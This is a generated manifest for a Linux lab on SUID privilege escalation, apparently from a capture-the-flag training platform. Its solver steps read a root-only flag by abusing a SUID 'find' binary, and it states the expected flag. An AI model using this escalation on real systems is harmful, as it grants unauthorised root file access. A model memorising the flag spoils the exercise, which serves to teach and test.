@@ -1,0 +1,37 @@
+# Generated from platform/labs/Linux/linux-3-3-suid-maze/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-3-3-suid-maze
+track: Linux
+difficulty: intermediate
+source: platform/labs/Linux/linux-3-3-suid-maze/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-3-3-suid-maze.sh
+  steps:
+  - name: SSH access as analyst
+    command: sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'whoami' 2>&1
+    expect: analyst
+  - name: Enumerate SUID binaries and find 'find' among them
+    command: sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | sort' 2>&1
+    expect: /usr/bin/find
+  - name: Read token 1 from clue file
+    command: sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'cat /home/analyst/clue.txt' 2>&1
+    expect: su1d_m4z3
+  - name: Exploit SUID find to read /root/flag.txt for token 2
+    command: sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
+    expect: p01s0n
+  - name: Assemble and verify the complete flag
+    command: echo 'OCR{su1d_m4z3_p01s0n}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{su1d_m4z3_p01s0n}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
